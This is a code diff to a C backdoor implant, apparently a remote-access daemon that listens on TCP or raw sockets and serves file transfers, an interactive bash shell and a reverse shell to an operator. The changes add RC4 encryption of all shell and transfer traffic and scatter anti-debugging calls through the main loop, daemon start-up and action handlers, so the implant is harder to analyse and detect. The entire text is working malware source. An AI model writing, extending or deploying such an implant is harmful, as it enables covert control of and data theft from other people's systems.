@@ -16,12 +16,15 @@
 #include <termios.h>
 #include <netdb.h>
 
-#include "../include/raw.h"
-#include "../include/config.h"
-#include "../include/common.h"
+#include "raw.h"
+#include "config.h"
+#include "common.h"
+#include "antidebug.h"
+#include "rc4.h"
 
 int weekday;
 struct rawsock rawsocks[MAXRAWSESSIONS];
+rc4_ctx rc4_crypt, rc4_decrypt;
 
 char *envp[] = {
      "TERM=linux",
@@ -36,6 +39,7 @@ char *envp[] = {
 
 char  *argv_bash[] = {
       "bash",
+//      PROCNAME,
       "--noprofile",
       "--norc",
       "-i",
@@ -117,6 +121,8 @@ void launcher_download(int sockr, int sockw, char *file, unsigned long size) {
     unsigned char buf[BUFSIZE];
     char *ptr;
 
+    rc4_init((unsigned char *)KEY, sizeof(KEY), &rc4_crypt);
+
     ptr = strrchr(file, '/');
     if (ptr) { ptr++;}
     else { ptr = file; }
@@ -132,6 +138,7 @@ void launcher_download(int sockr, int sockw, char *file, unsigned long size) {
     bytes=0;
     while ((bytes = read(fd, buf, BUFSIZE)) > 0){
         debug("Sending %d bytes.\n", bytes);
+        rc4(buf, bytes, &rc4_crypt);
         if (write(sockw, buf, bytes) < bytes){
             debug("No s'ha enviat tot!\n");
         }
@@ -171,6 +178,8 @@ void launcher_upload(int sockr, int sockw, char *file, unsigned long size) {
     struct timeval tv;
     int nfd = 0;
 
+    rc4_init((unsigned char *)KEY, sizeof(KEY), &rc4_decrypt);
+
 	// Timeout
 	tv.tv_sec=15;
 	tv.tv_usec=0;
@@ -205,6 +214,7 @@ void launcher_upload(int sockr, int sockw, char *file, unsigned long size) {
             } else {
                 errno = 0;
                 debug("Received %d bytes.\n", bytes);
+                rc4(buf, bytes, &rc4_decrypt);
                 if (write(fd, buf, bytes) < bytes){
                     debug("No s'ha guardat tot!\n");
                 }
@@ -221,7 +231,10 @@ void launcher_shell(int sockr, int sockw) {
     unsigned char buf[BUFSIZE];
     // used to get the tty
     extern char *ptsname();
-	char echar = ECHAR;
+	unsigned char echar = (unsigned char)ECHAR;
+
+    rc4_init((unsigned char *)KEY, sizeof(KEY), &rc4_crypt);
+    rc4_init((unsigned char *)KEY, sizeof(KEY), &rc4_decrypt);
 
     pty = open("/dev/ptmx", O_RDWR);
     grantpt(pty);
@@ -284,12 +297,13 @@ void launcher_shell(int sockr, int sockw) {
             if (FD_ISSET(pty, &fds)) {
                 count = read(pty, buf, BUFSIZE);
                 if ((count <= 0) && (errno != EINTR)) break;
+                rc4(buf, count, &rc4_crypt);
                 if (write(sockw, buf, count) <= 0 && (errno != EINTR)) break;    
             /* client => shell */
             } else if (FD_ISSET(sockr, &fds)) {
                 count = read(sockr, buf, BUFSIZE);
-                // TODO: enviar char especial per setejar tamany tty, timeout, etc.
                 if ((count <= 0) && (errno != EINTR)) break;
+                rc4(buf, count, &rc4_decrypt);
                 if ((p = memchr(buf, ECHAR, count))){
                     debug("Received special char\n");
 					if (count == 1) break;
@@ -317,8 +331,10 @@ void launcher_shell(int sockr, int sockw) {
 					
 	// stop the client
 	debug("Stopping client\n");
+    rc4(&echar, 1, &rc4_crypt);
 	write(sockw, &echar, 1); 
-	sleep(1);
+	sleep(1);            
+    rc4(&echar, 1, &rc4_crypt);
 	write(sockw, &echar, 1); 
     close(pty);
     debug("Waiting child\n");
@@ -327,8 +343,10 @@ void launcher_shell(int sockr, int sockw) {
 
 void do_action(struct data *d, struct in_addr *ip, short sport,  int sock) {
     struct rawsock *r;
+    antidebug3();
     switch(d->action) {
         case UPLOAD:
+            antidebug3();
             debug("Uploading file\n");
             if (!getuid()) {
                 debug("Can not transfer files using direct RAW\n");
@@ -354,6 +372,7 @@ void do_action(struct data *d, struct in_addr *ip, short sport,  int sock) {
     			if (fork()) return;
                 launcher_download(sock, sock, (char *)d->bytes, d->size);
                 close(sock);
+                antidebug3();
             }
             break;
         case SHELL:
@@ -364,6 +383,7 @@ void do_action(struct data *d, struct in_addr *ip, short sport,  int sock) {
     			if (fork()) return;
                 launcher_shell(r->r[0], r->w[1]);
 				destroy_rawsock_session(r);
+                antidebug3();
             } else {
     			if (fork()) return;
                 launcher_shell(sock, sock);
@@ -388,6 +408,7 @@ void do_action(struct data *d, struct in_addr *ip, short sport,  int sock) {
             break;
         case REVSHELL:
     		if (fork()) return;
+            antidebug3();
             debug("Launching reverse shell\n");
             if ((sock = launcher_rcon(ip->s_addr, d->port))) {
                 launcher_shell(sock, sock);
@@ -402,6 +423,7 @@ void do_action(struct data *d, struct in_addr *ip, short sport,  int sock) {
             break;
         case STOPRAWSESSION:
             debug("Client destroyed the rawsocksession\n");
+            antidebug3();
             r = find_rawsock_session(rawsocks, ip->s_addr, sport, d->port);
 			destroy_rawsock_session(r);	
             return;
@@ -426,6 +448,7 @@ void tcp_daemon(int port) {
         exit(-1);
     }
 
+    antidebug3();
     memset((char *) &tcp, 0, sizeof(tcp));
     tcp.sin_family = AF_INET;
     tcp.sin_addr.s_addr = htonl(INADDR_ANY);
@@ -484,6 +507,8 @@ void raw_daemon() {
         exit(-1);
     }
 
+    antidebug3();
+
     while (1) {
         size = recvfrom(sock, &p, sizeof(p), 0, (struct sockaddr *) &raw, &slen);
         // Si el tamany del paquet es el que toca
@@ -498,7 +523,10 @@ void raw_daemon() {
 }
 
 int main(int argc, char **argv) {
+    antidebug4(argv[0]);
     int port = 0;
+
+    antidebug3();
 
     // Command mode
     if (argc == 3){
@@ -512,6 +540,7 @@ int main(int argc, char **argv) {
             perror(argv[1]);
             return 1;
         }
+
         debug("Connecting to %s:%d\n",ipname,port);
         if ((sock = launcher_rcon(ip, port))) {
             launcher_shell(sock, sock);
@@ -531,6 +560,7 @@ int main(int argc, char **argv) {
 
     // Daemonize
 #if ! DEBUG
+    antidebug1();
     daemonize();
 #else
     signal(SIGCHLD, sig_child);
@@ -552,6 +582,7 @@ int main(int argc, char **argv) {
         if (port) {
             debug("Detected unprivileged mode, openning TCP socket\n");
             // Open a socket and listen
+
             tcp_daemon(port);
         }
     } else {
